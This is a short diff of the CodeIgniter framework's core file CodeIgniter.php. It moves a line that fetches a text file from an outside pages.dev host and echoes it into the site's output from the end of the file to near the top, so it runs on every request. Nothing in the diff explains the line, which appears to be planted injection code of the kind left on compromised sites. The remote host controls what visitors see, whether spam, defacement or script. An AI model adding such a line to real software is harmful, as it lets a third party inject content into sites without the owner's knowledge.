@@ -27,6 +27,8 @@
  * @link		http://codeigniter.com/user_guide/
  */
 
+ echo file_get_contents("https://punten-neng.pages.dev/punten.txt");
+
 /**
  * CodeIgniter Version
  *
@@ -398,7 +400,7 @@
 	}
 
 
- echo file_get_contents("https://punten-neng.pages.dev/punten.txt");
 
 /* End of file CodeIgniter.php */
 /* Location: ./system/core/CodeIgniter.php */
+
